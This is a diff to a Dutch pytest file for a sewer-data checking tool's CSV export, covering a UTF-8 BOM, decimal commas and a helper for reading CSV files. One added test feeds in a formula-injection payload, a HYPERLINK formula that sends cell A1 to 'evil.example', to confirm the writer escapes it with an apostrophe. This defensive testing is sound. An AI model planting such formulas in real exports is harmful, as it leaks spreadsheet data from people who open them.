@@ -24,6 +24,7 @@ import pandas as pd
 import pytest
 from gwsw_orox_helpers.dataset import load_dataset
 
+from helpers_csv import lees_csv
 from nlriochecker import __version__
 from nlriochecker.analysis import MetingAnalysis, analyze
 from nlriochecker.checkconfig import load_check_config
@@ -250,7 +251,7 @@ def test_schrijf_markdown_zonder_markering_blijft_ongewijzigd(tmp_path: Path) ->
 def test_schrijf_csv_zet_de_herkomstkolom_achteraan(tmp_path: Path) -> None:
     """De kolom komt achter de bestaande, zodat kolomvolgorde niet verschuift."""
     pad = schrijf_csv(pd.DataFrame({"Check": ["TOP-001", "NET-004"]}), tmp_path / "t.csv")
-    tabel = pd.read_csv(pad, sep=";", encoding="utf-8")
+    tabel = lees_csv(pad)
 
     assert list(tabel.columns) == ["Check", KOLOM_GEREEDSCHAP]
     assert list(tabel[KOLOM_GEREEDSCHAP]) == [gereedschap(), gereedschap()]
@@ -265,7 +266,7 @@ def test_schrijf_csv_houdt_gwsw_uris_heel(tmp_path: Path) -> None:
     uri = "http://sparql.gwsw.nl/dewolden#knp3437"
     pad = schrijf_csv(pd.DataFrame({"ObjectURI": [uri]}), tmp_path / "t.csv")
 
-    assert pd.read_csv(pad, sep=";", encoding="utf-8")["ObjectURI"][0] == uri
+    assert lees_csv(pad)["ObjectURI"][0] == uri
 
 
 def test_schrijf_csv_laat_de_meegegeven_tabel_ongemoeid(tmp_path: Path) -> None:
@@ -280,7 +281,7 @@ def test_schrijf_csv_verdraagt_een_lege_tabel(tmp_path: Path) -> None:
     """Een tabel zonder rijen levert wel de kolomkop op, en geen uitzondering."""
     pad = schrijf_csv(pd.DataFrame(), tmp_path / "leeg.csv")
 
-    assert KOLOM_GEREEDSCHAP in pd.read_csv(pad, sep=";", encoding="utf-8").columns
+    assert KOLOM_GEREEDSCHAP in lees_csv(pad).columns
 
 
 def test_schrijf_csv_weigert_een_eigen_herkomstkolom(tmp_path: Path) -> None:
@@ -289,6 +290,62 @@ def test_schrijf_csv_weigert_een_eigen_herkomstkolom(tmp_path: Path) -> None:
 
     with pytest.raises(ValueError, match=KOLOM_GEREEDSCHAP):
         schrijf_csv(tabel, tmp_path / "t.csv")
+
+
+def test_schrijf_csv_begint_met_de_utf8_bom(tmp_path: Path) -> None:
+    """De UTF-8-BOM (`EF BB BF`) zet nl-NL Excel op UTF-8 in plaats van Windows-1252.
+
+    Zonder haar leest Excel `één` als `Ã©Ã©n` in elke meldingstekst (issue #165).
+    """
+    pad = schrijf_csv(pd.DataFrame({"Label": ["één"]}), tmp_path / "t.csv")
+
+    assert pad.read_bytes()[:3] == b"\xef\xbb\xbf"
+
+
+def test_schrijf_csv_geeft_een_getalcel_een_decimaalkomma(tmp_path: Path) -> None:
+    """Een tekstcel die een kaal getal is (`-0.350`) krijgt de nl-NL-decimaalkomma.
+
+    En géén formule-apostrof: een leidend minteken vóór een cijfer laat de cel een
+    getal, geen formule (issue #165).
+    """
+    pad = schrijf_csv(pd.DataFrame({"Waarde": ["-0.350", "2.150"]}), tmp_path / "t.csv")
+
+    tekst = pad.read_text(encoding="utf-8-sig")
+    assert "-0,350" in tekst
+    assert "2,150" in tekst
+    assert "'-0,350" not in tekst
+
+
+def test_schrijf_csv_geeft_alleen_het_leidende_getal_van_drempel_een_komma(tmp_path: Path) -> None:
+    """In `Drempel` krijgt alleen het leidende getal een komma; de rest blijft tekst."""
+    pad = schrijf_csv(
+        pd.DataFrame({"Drempel": ["0.10 (drempels.tegenverhang_fors_m)"]}), tmp_path / "t.csv"
+    )
+
+    assert "0,10 (drempels.tegenverhang_fors_m)" in pad.read_text(encoding="utf-8-sig")
+
+
+def test_schrijf_csv_zet_een_apostrof_voor_een_formulecel(tmp_path: Path) -> None:
+    """Een cel die met `=` begint krijgt een apostrof, zodat Excel haar niet uitvoert."""
+    label = '=HYPERLINK("http://evil.example/"&A1;"klik")'
+    pad = schrijf_csv(pd.DataFrame({"Label": [label]}), tmp_path / "t.csv")
+
+    assert lees_csv(pad)["Label"][0] == "'" + label
+
+
+def test_schrijf_csv_schrijft_een_float_met_een_decimaalkomma(tmp_path: Path) -> None:
+    """Een float-kolom (zoals X en Y) draagt de nl-NL-decimaalkomma (issue #165)."""
+    pad = schrijf_csv(pd.DataFrame({"X": [229981.98]}), tmp_path / "t.csv")
+
+    assert "229981,98" in pad.read_text(encoding="utf-8-sig")
+
+
+def test_schrijf_csv_laat_een_gewone_tekstcel_met_komma_ongemoeid(tmp_path: Path) -> None:
+    """De getalregel raakt alleen kale getallen: een label met een komma blijft heel."""
+    label = "Ruinerwold één, Dwingeloo"
+    pad = schrijf_csv(pd.DataFrame({"Label": [label]}), tmp_path / "t.csv")
+
+    assert lees_csv(pad)["Label"][0] == label
 
 
 def test_alle_markdown_rapporten_noemen_het_gereedschap(uitvoermap: Path) -> None:
@@ -313,7 +370,7 @@ def test_alle_csv_bestanden_dragen_de_herkomstkolom(uitvoermap: Path) -> None:
 
     assert {pad.name for pad in paden} == CSV_BESTANDEN
     for pad in paden:
-        tabel = pd.read_csv(pad, sep=";", encoding="utf-8")
+        tabel = lees_csv(pad)
         assert list(tabel.columns)[-1] == KOLOM_GEREEDSCHAP, pad.name
         assert not tabel.empty, pad.name
         assert (tabel[KOLOM_GEREEDSCHAP] == gereedschap()).all(), pad.name
@@ -578,7 +635,7 @@ def test_schrijf_uitvoer_levert_de_json_uit_dezelfde_meldingenstroom(
 
     assert uitvoer.json is not None
     document = json.loads(uitvoer.json.read_text(encoding="utf-8"))
-    csv = pd.read_csv(tmp_path / FILE_CHECKS_CSV, sep=";", encoding="utf-8")
+    csv = lees_csv(tmp_path / FILE_CHECKS_CSV)
     assert document["aantal_meldingen"] == len(document["meldingen"]) == len(csv)
 
 
@@ -880,7 +937,7 @@ def test_de_csv_krijgt_de_checkscope_niet(toets: CheckRun, tmp_path: Path) -> No
     uitvoer = schrijf_uitvoer(toets, tmp_path, RUNDATUM, met_geopackage=False)
 
     assert uitvoer.csv is not None
-    kolommen = list(pd.read_csv(uitvoer.csv, sep=";", encoding="utf-8").columns)
+    kolommen = list(lees_csv(uitvoer.csv).columns)
 
     assert "bekeken_scope" not in kolommen
     assert "Gaat over" not in kolommen
